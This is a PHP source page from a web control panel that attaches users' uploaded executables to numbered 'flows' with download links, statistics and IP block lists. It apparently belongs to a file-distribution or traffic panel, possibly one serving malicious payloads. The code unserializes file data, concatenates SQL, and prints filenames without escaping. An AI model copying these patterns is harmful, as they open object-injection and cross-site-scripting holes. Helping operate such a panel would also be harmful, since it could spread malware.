<?php

include_once('./gears/page_php_header.php');

if ($config['user']['rights']['pages']['p_flows']['is']!='on') { Exit('<h1>Access denied</h1>'); } 

// ============================== CODE ============================== //

	function getUserExeAsSelectOptions($file_id) {
		global $config;
		$exe = cdim('db','query',"SELECT * FROM `files` WHERE user_id = ".$config['user']['id']);
		
		if ($file_id==NULL) { $sel = 'selected'; } else { $sel = ''; }
		
		$out = '<option value="empty" '.$sel.'>--- select file ---</option>';
		$sel = '';
		
		if (isset($exe)) {
			foreach($exe as $k=>$v) {
				if ($file_id == $v->id) $sel = 'selected'; else $sel = '';
				$out .= '<option value="'.$v->id.'" '.$sel.'>'.$v->filename.'</option>';
			}
		}
		return $out;
	}

	
?>
	<script>
		
		$(document).ready(function(){ $('#waitPageModal').modal('hide'); });
		
		function updateFlowFile(flow_id, sObj) {
		
			var drop = false;
			var file_id = $(sObj).find(':selected').val();
			if (file_id == 'empty') drop = true;
			//console.log(file_id);

			$.ajax({
				url: './gears/updateFlow.php',
				type: 'POST',
				dataType: 'JSON',
				async: false,
				data : {
					flow: flow_id,
					file: file_id,
					unlink: drop
				},
				success: function(data) {
					notify('info', data.msg);
				}
			});		
		}
		
		function getApiLink(flow_id) {
			if ($('select[data-flowId='+flow_id+']').find(':selected').val()=='empty') {
				notify('info', 'Нужно выбрать файл');
			} else {
				$.ajax({
					url: './gears/getApiLink.php',
					type: 'POST',
					dataType: 'JSON',
					async: false,
					data : {
						flow_id: flow_id,
					},
					success: function(data) {
						notify(data.type, data.msg);
						window.open(data.msg);
					}
				});		
			}
		}
		
		function clearStat(flow_id) {
			if (confirm('Really clear this flow statistics?')) {
				$.ajax({
					url: './gears/clearFlowStat.php',
					type: 'POST',
					dataType: 'JSON',
					async: false,
					data : {
						flow_id: flow_id,
						user_id: <?php echo $config['user']['id']; ?>,
					},
					success: function(data) {
						notify('info', data.msg);
					}
				});					
			}
		}

		function flow_switch(flow_id) {

				$.ajax({
					url: './gears/flowSwitch.php',
					type: 'POST',
					dataType: 'JSON',
					async: false,
					data : {
						flow_id: flow_id,
						user_id: <?php echo $config['user']['id']; ?>,
					},
					success: function(data) {
						notify('info', data.msg);
					}
				});					

		}

		function changeIpList(flow_id) {
			    var blst = document.getElementById("block_iplist_"+flow_id);
				$.ajax({
					url: './gears/changeIpList.php',
					type: 'POST',
					dataType: 'JSON',
					async: false,
					data : {
						flow_id: flow_id,
						user_id: <?php echo $config['user']['id']; ?>,
						ip_list: blst.value,
					},
					success: function(data) {
						notify('info', data.msg);
					}
				});					
		}

		function showBlock(flow_id)
		  {
		  var blk = document.getElementById("iplist_"+flow_id);
		  if (blk)
		    blk.style.display = "";
		  return true;
		  }
	</script>
	
	
	<h1>Flows</h1>
	
	<table class="listing">
	<thead><tr><th>Flow #id</th><th>File</th><th>Actions</th></tr></thead>
	<tbody>
		<?php
/********* ADDL::PUBLIC STATS *********/


function FindData($arr, $where_data)
  {
  //query = FindData($arr, array('name'=>'val', 'name2'=>'val2'));
  if ($arr === FALSE)
    return false;
  $e = FALSE;
  if (count($arr) == 0)
    return false;
  foreach($arr AS $k=>$v)
    {
    $q = 0;
    $w_count = count($where_data);
    if ($w_count == 0)
      return false;
    foreach($where_data AS $ka=>$va)
      {
      if (isset($arr[$k][$ka]) && $arr[$k][$ka] == $va)
	$q++;
      }
    if ($q == $w_count)
      {
      $e = $k;
      break;
      }
    }
  if ($e !== FALSE)
    {
    $p = $e;
    $e = $arr[$e];
    $e['num'] = $p;
    unset($arr);
    return $e;
    }
  return false;
  }

  $ps_runfile = './addl/ps_runfile';
  $ps_file_arr = array();
    if (file_exists($ps_runfile))
      {
      $ps_filedata = @file_get_contents($ps_runfile);
      if ($ps_filedata !== FALSE)
	{
	$ps_file_arr = unserialize($ps_filedata);
	}
      }
      else
      {
      $ps_file_arr[] = array();
      @file_put_contents($ps_runfile, serialize($ps_file_arr));
      }
    
    $block_lst = array();
    $block_list_way = 'addl/block_list_'.$config['user']['id'].'.lst';
    if (file_exists($block_list_way))
      {
      $f_data = @file_get_contents($block_list_way);
      $block_lst = unserialize($f_data);
      }

/********* ADDL::PUBLIC STATS *********/

			$f = cdim('db','query',"SELECT * FROM `flows` WHERE user_id = ".$config['user']['id']);
			if (isset($f)) foreach($f as $k=>$v) {
			  $ps_exists = false;
			  $ps_public_key = false;
			  if ($ps_file_arr !== FALSE)
			    {
			    $ps_data = FindData($ps_file_arr, array('user_id'=>$config['user']['id'], 'flow_id'=>$v->id));

			    if ($ps_data != false)
			      {
			      $ps_exists = true;
			      $ps_public_key = $ps_data['public_key'];
			      }
			    }
			    $b_list_str = isset($block_lst[$v->id]) ? implode(',',$block_lst[$v->id]) : '';
				echo '
						<tr class="rig_line" data-userProxyLine="'.$v->id.'">
							<td class="rig_line_1"><span>Flow id</span>'.$v->id.'</td>
							<td class="rig_line_2">
								<select onChange="updateFlowFile('.$v->id.', this);" class="exeSelector" data-flowId="'.$v->id.'">
									'.getUserExeAsSelectOptions($v->file_id).'
								</select>&nbsp;
								<input type="checkbox" name="public_stats" id="flow_'.$v->id.'" '.(($ps_exists) ? 'checked=\'true\'' : '').' onclick="flow_switch('.$v->id.');"> Public stats  '.(($ps_exists) ? '<a href="public_stats.php?pkey='.$ps_public_key.'" target="_blank">Get link</a>' : '').'
							</td>
							<td class="rig_line_3">
								<strong onClick="getApiLink('.$v->id.');" class="btn btn-success">Get Link</strong>
								<strong onClick="clearStat('.$v->id.');" class="btn btn-danger">Clear stat</strong>
								<strong onClick="showBlock('.$v->id.');" class="btn btn-success">IpList</strong><strong id="iplist_'.$v->id.'" style="display:none;"><input id="block_iplist_'.$v->id.'" type="text" value="'.$b_list_str.'" style="width:100px;font-family:Arial; font-size:12px; text-align:center; height:20px;margin:0px;"><strong onClick="changeIpList('.$v->id.');" class="btn btn-success">Save</strong></strong>
							</td>
						</tr>
					';
	
				
			}
	
		?>
	
	</tbody>
	</table>
